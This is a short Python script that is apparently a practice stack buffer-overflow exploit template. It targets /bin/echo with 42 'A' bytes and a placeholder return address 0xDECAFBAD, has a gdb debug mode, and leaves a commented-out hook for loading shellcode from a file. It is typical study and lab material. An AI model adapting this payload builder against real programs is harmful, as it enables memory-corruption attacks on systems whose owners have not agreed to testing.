#!/usr/bin/env python

TARGET = "/bin/echo"

#~~~~~~~~~
import sys, os, struct
DEBUG  = 'DEBUG' in sys.argv
def p(a):
  return struct.pack('I', a)
def run(args):
    if DEBUG:
      os.execvp("gdb", ["gdb", "--args", TARGET] + args)
    else:
      os.execv(TARGET, [TARGET] + args)
#~~~~~~~~~

# with open('e-penis') as f:
#   shellcode = f.read()

# args = [shellcode]

ret_addr = "\xAD\xFB\xCA\xDE" # 0xDECAFBAD
ret_addr = p(0xDECAFBAD)
overflow = "A" * 42
args = [overflow + ret_addr]

run(args)

